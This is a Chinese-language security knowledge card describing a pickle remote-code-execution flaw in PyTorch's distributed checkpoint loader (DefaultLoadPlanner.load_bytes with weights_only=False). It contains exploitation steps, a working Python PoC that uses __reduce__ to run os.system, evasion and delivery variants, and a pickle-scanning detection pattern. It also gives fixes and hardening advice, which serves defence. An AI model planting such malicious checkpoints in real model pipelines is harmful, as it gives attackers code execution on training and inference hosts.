---
id: ai-security-supply-chain-pytorch-dcp-load-bytes-weights-only-pickle-rce
title: PyTorch 分布式检查点 BYTE_IO 经 DefaultLoadPlanner.load_bytes 以 weights_only=False 反序列化：加载恶意 .distcp 检查点触发 pickle RCE
type: scenario
domain: ai-security
path: ai-security/supply-chain
technique: pytorch-distributed-checkpoint-load-bytes-pickle-rce
aliases:
- PyTorch 分布式检查点 RCE
- DefaultLoadPlanner.load_bytes
- torch.distributed.checkpoint 反序列化
- .distcp 恶意检查点
- weights_only=False pickle
tags:
- ai-supply-chain
- pytorch
- distributed-checkpoint
- distcp
- pickle
- deserialization
- rce
- model-loading
- weights-only
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V178
  verified_at: '2026-11-06T11:41:33+08:00'
  notes: 已对照原文与3张截图核对：DefaultLoadPlanner.load_bytes 中 weights_only=False、FileSystemReader BYTE_IO 分支直传、__reduce__/os.system PoC、/tmp/torch_load_pwned 执行成功、张量路径 weights_only=True 对比均一致。原文无 CVE/版本，卡片未设 affected_versions 正确；卡片已明确标注原文未展示 distributed_checkpoint.load 端到端链。未验证点：PoC 未在本机执行。
---

## 一句话结论

PyTorch 分布式检查点（Distributed Checkpoint）的 `DefaultLoadPlanner.load_bytes()` 对 `LoadItemType.BYTE_IO` 类型的数据直接调用 `torch.load(value, weights_only=False)`；`FileSystemReader.read_data()` 从检查点文件读取原始字节后不做任何校验就传入该 sink，攻击者只要让受害者加载一个内容为恶意 pickle 的 `.distcp` 检查点文件，即可在加载进程内执行任意 Python 代码。

## 原理

- PyTorch 分布式检查点把 state_dict 拆分成按 storage 描述的文件（如 `.0.distcp`），由 `StorageReader` 读取、`LoadPlanner` 组装。`FileSystemReader.read_data()` 遍历 `LoadPlan` 中的 `ReadItem`，当 `req.type == LoadItemType.BYTE_IO` 时把文件切片读入 `io.BytesIO`，随后调用 `planner.load_bytes(req, read_bytes)`；这条路径没有对字节内容做类型、格式或来源校验。
- Sink 在 `torch/distributed/checkpoint/default_planner.py` 的 `DefaultLoadPlanner.load_bytes()`：无论 `flatten_state_dict` 开关如何，都执行 `torch.load(value, weights_only=False)`（`flatten_state_dict=True` 时经 `set_element` 写入映射后的 key）。
- `weights_only=False` 是关键：它让 `torch.load()` 走完整的 pickle 反序列化，而不是只允许张量/基础类型的安全加载器。pickle 在还原对象时会调用对象 `__reduce__()` 返回的 callable 及参数，因此 `return (os.system, (cmd,))` 就能把“加载权重”变成“执行系统命令”。
- 攻击面在于检查点是典型的外部制品：模型仓库、训练任务输出、共享存储、CI 产物、断点续训目录都可能被投递或替换；而 `.distcp` 文件内容本身就是攻击者可控的 pickle 字节流。
- 同一模块中对张量类型数据使用 `torch.load(..., weights_only=True)` 加载（安全），`BYTE_IO` 分支却使用 `weights_only=False`，说明这是加载器实现中的不一致，而非调用方误用；调用方即使从可信代码发起加载，也无法阻止恶意检查点文件触发 sink。
- 该 RCE 不要求检查点结构完整：只要 `load_bytes()` 被调用，`torch.load` 在返回对象前就会执行 `__reduce__`，即使后续组装 state_dict 失败，命令也已执行。

## 触发条件

- 目标 PyTorch 版本包含上述 `DefaultLoadPlanner.load_bytes()` 实现，且 `torch.distributed.checkpoint` 可用。
- 受害者从攻击者可控的目录/存储加载分布式检查点（`FileSystemReader` + `distributed_checkpoint.load`，或直接把检查点字节传入 `load_bytes`）。
- 检查点内存在或可被诱导按 `BYTE_IO` 读取的文件（如 `.distcp`），内容为恶意 pickle。
- 加载进程具备命令执行权限（通常即训练/推理节点用户权限），且未在加载前对检查点做隔离解析或沙箱运行。

## 利用步骤

1. 定义 `class MaliciousPayload`，实现 `__reduce__()` 返回 `(os.system, (cmd,))`，用 `torch.save(MaliciousPayload(), io.BytesIO())` 得到 pickle 字节流。
2. 把该字节流写入检查点目录中的 `.0.distcp` 文件（模拟分布式检查点的存储文件）。
3. 构造 `ReadItem(type=LoadItemType.BYTE_IO, ...)`，用 `DefaultLoadPlanner.load_bytes(read_item, BytesIO(file_bytes))` 触发；或让受害者的 `FileSystemReader.read_data()` 在正常 `distributed_checkpoint.load` 流程中按 `BYTE_IO` 读取该文件。
4. 命令在 `torch.load` 反序列化阶段执行，随后才返回 state_dict；攻击者可用文档中的 `touch /tmp/torch_load_pwned` 或回连命令验证。
5. 无公开受影响版本/CVE 信息；实际利用前需按目标 PyTorch 源码确认 `load_bytes` 是否仍硬编码 `weights_only=False`。

## PoC

```python
import io
import os
import tempfile
from pathlib import Path

import torch
from torch.distributed.checkpoint import DefaultLoadPlanner
from torch.distributed.checkpoint.metadata import MetadataIndex
from torch.distributed.checkpoint.planner import LoadItemType, ReadItem


class MaliciousPayload:
    def __reduce__(self):
        return (os.system, ('id > /tmp/torch_load_pwned',))


checkpoint_dir = tempfile.mkdtemp(prefix="pytorch_dist_")
distcp_file = Path(checkpoint_dir) / ".0.distcp"

buf = io.BytesIO()
torch.save(MaliciousPayload(), buf)
distcp_file.write_bytes(buf.getvalue())

planner = DefaultLoadPlanner(flatten_state_dict=False)
planner.state_dict = {}

read_item = ReadItem(
    type=LoadItemType.BYTE_IO,
    dest_index=MetadataIndex(fqn="key"),
    dest_offsets=torch.Size([]),
    storage_index=MetadataIndex(fqn="key"),
    storage_offsets=torch.Size([]),
    lengths=torch.Size([]),
)

with open(distcp_file, "rb") as f:
    planner.load_bytes(read_item, io.BytesIO(f.read()))

if os.path.exists("/tmp/torch_load_pwned"):
    print("[+] RCE")
```

（PoC 仅使用无害命令验证代码执行，未在本次环境中运行。）

## 变体与关联

- 变体：把恶意对象与合法权重字节混合，或让恶意 `BYTE_IO` 项与正常张量项共存，使检查点看起来仍可加载，降低检测可疑度。
- 变体：通过模型仓库、训练任务输出目录、共享 NFS/对象存储的检查点前缀、CI 制品等投递恶意 `.distcp`；任何“从外部恢复训练/加载 checkpoint”的流程都是入口。
- 变体：如果 `flatten_state_dict=True`，sink 经 `set_element` 写入 `original_state_dict`，仍需在 `mappings` 中存在对应 fqn，攻击者可用检查点元数据中的合法 key 满足该条件。
- 关联：[[ai-security-supply-chain-pytorch-export-load-use-pickle-rce]]（`torch.export.load` 的 `_load_state_dict` 同样硬编码 `weights_only=False`）、[[ai-security-supply-chain-vllm-torch-load-weights-only-pickle-rce]]（vLLM 权重加载漏设 `weights_only=True`）、[[ai-security-supply-chain-huggingface-pickle-model-reverse-shell]]（传统恶意模型 pickle）。
- 边界：本卡描述的是代码级 sink 与最小触发，原文未给出 CVE/受影响版本，也未展示完整 `distributed_checkpoint.load` 端到端调用链；若目标版本已将 `load_bytes` 改为 `weights_only=True`，或加载前对检查点做了安全解析/沙箱隔离，则本手法不成立。

## 检测与防御

- 检测：审计 PyTorch 版本与 `torch/distributed/checkpoint/default_planner.py` 中 `load_bytes()` 是否仍使用 `weights_only=False`；对检查点目录/`.distcp` 文件做 pickle 静态扫描（`GLOBAL`/`STACK_GLOBAL`/`os.system`/`subprocess`/`socket` 等）；监控加载进程拉起 shell、写入敏感路径或外连的异常行为。
- 修复：将 `DefaultLoadPlanner.load_bytes()` 中的 `torch.load(value, weights_only=False)` 改为 `weights_only=True`；或在反序列化前对 `BYTE_IO` 数据做类型白名单校验（仅允许 Tensor/基础容器）；升级到已修复该 sink 的 PyTorch 版本。
- 加固：把不可信检查点当作可执行代码，加载前在无网络、低权限、只读文件系统的沙箱/容器内运行；检查点使用签名/哈希校验并固定来源；优先使用 safetensors 等纯张量格式；禁止从共享或用户可控路径直接恢复检查点。
